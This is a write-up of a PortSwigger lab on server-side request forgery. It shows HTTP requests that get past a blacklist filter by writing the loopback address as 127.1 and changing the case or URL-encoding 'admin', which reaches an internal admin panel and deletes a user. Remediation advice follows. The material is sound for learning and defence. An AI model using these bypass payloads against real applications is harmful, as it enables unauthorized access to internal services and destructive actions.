# PortSwigger Lab: SSRF with blacklist-based input filter

**TAGS:** SSRF, Server-Side Request Forgery, Filter Bypass, Burp Suite

**Category:** SSRF  
**Date:** November 11, 2026  
**Day:** Wednesday  
**Link:** https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-blacklist  
**Published:** Ready  
**Status:** Done

---

## Intro

This is the third lab in the SSRF series. Now the application tries to protect the stock check with a blacklist. It blocks the obvious localhost addresses and even the word "admin". The problem is that blacklists can be easy to bypass when there is more than one way to write the same IP address or path.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says the stock check URL is protected by a blacklist, and the goal is to bypass it to reach the admin interface and delete the user `carlos`.

I opened a product and captured the stock request:

```http
POST /product/stock HTTP/2
Host: 0a02001303f19c3380cdcb5b00430028.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

My first tries were rejected. Pointing it at `http://127.0.0.1/` returned:

```text
External stock check blocked for security reasons
```

So there was a filter, and I needed to find out exactly what it blocked.

---

## Exploitation:

#### Step 1: Bypass the IP blacklist

The filter rejected `127.0.0.1`, so I tried an alternative way of writing the same address. Many URL parsers and networking libraries interpret `127.1` as `127.0.0.1`:

```http
POST /product/stock HTTP/2
Host: 0a02001303f19c3380cdcb5b00430028.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.1/
```

This time the request succeeded.

The result suggested that the filter was checking specific representations of internal addresses rather than validating the actual destination after normalization.

#### Step 2: Bypass the path blacklist

Next I tried `http://127.1/admin`, but it was blocked again. The filter also appeared to check for the string "admin".

I changed the case:

```http
POST /product/stock HTTP/2
Host: 0a02001303f19c3380cdcb5b00430028.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.1/Admin
```

The response contained the admin panel, showing the links to delete users:

```text
/admin/delete?username=wiener
/admin/delete?username=carlos
```

URL encoding worked too. I tested `http://127.1/adm%69n` and `http://127.1/%61dmin`, and both reached the same page.

These results suggested that the filter did not consistently normalize the path before checking it.

#### Step 3: Delete carlos

I changed the URL to the delete endpoint, keeping the same case trick:

```http
POST /product/stock HTTP/2
Host: 0a02001303f19c3380cdcb5b00430028.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.1/Admin/delete?username=carlos
```

The server reached the administrative deletion endpoint. The user `carlos` was deleted and the lab was solved.

---

## Root Cause

The application protects the stock URL with a blacklist, but the filter does not recognize all equivalent representations of the blocked destinations.

It rejects `127.0.0.1` and `localhost`, but allows `127.1`, which many URL parsers interpret as the same loopback address.

The filter also blocks the lowercase string "admin", but the application accepts alternative representations such as "Admin" and URL-encoded characters.

Because the filter does not consistently normalize the URL before validation, different representations of the same destination can bypass its restrictions.

The underlying problem is that the application relies on matching specific strings instead of validating the actual destination of the outgoing request.

---

## Impact

A blacklist that relies on specific strings is an unreliable defense against SSRF.

An attacker may be able to reach internal endpoints using alternative IP representations, different character casing, or encoded paths.

In this lab, the bypass allowed access to the internal admin panel and the deletion of a user.

In a real application, a similar vulnerability could expose internal services, sensitive information, or administrative functionality. Depending on the accessible systems, it could also lead to further compromise.

---

## Remediation

To prevent this issue, applications should:

- Use an allowlist of permitted destinations instead of relying on a blacklist of known dangerous addresses.
- Parse and normalize URLs consistently before validation.
- Resolve hostnames and validate the resulting IP addresses, including alternative representations of loopback and private addresses.
- Restrict access to internal IP ranges and cloud metadata endpoints at the network level.
- Validate redirects and ensure that the final destination is still permitted.
- Authenticate and authorize every internal endpoint instead of relying on the assumption that internal services cannot be reached externally.

---

## Key Takeaways

1. Blacklists based on specific strings can fail when equivalent representations of a destination are accepted.
2. `127.1` is an alternative representation of `127.0.0.1` supported by many URL parsers.
3. Case changes and URL encoding can bypass filters that do not normalize paths consistently.
4. Always validate the actual destination of a request, not just the original URL string.

---

## References

- PortSwigger — Server-side request forgery (SSRF): https://portswigger.net/web-security/ssrf
- PortSwigger — SSRF with blacklist-based input filter (lab): https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-blacklist
- OWASP — Server-Side Request Forgery: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.